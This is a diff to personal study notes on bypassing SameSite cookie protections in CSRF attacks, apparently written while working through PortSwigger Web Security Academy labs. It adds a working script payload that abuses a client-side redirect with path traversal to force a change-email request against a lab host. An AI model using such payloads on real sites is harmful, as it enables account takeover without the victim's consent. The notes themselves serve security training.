@@ -39,9 +39,16 @@ Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of
 </form>
 ```
 
-## Bypassing SameSite restrictions using on-site gadgets
+## Bypassing using on-site gadgets
 One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters. Example: [[Open redirection]]
 It works only with client-side redirects.
+Example
+```html
+<script>
+window.location.replace('https://0a45008403ba507480fc087a00de00d7.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=newMail%40gmail.com%26submit=1');
+</script>
+```
 
+## Bypassing via vulnerable sibling domains
+https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
 #to-be-continued 
-https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
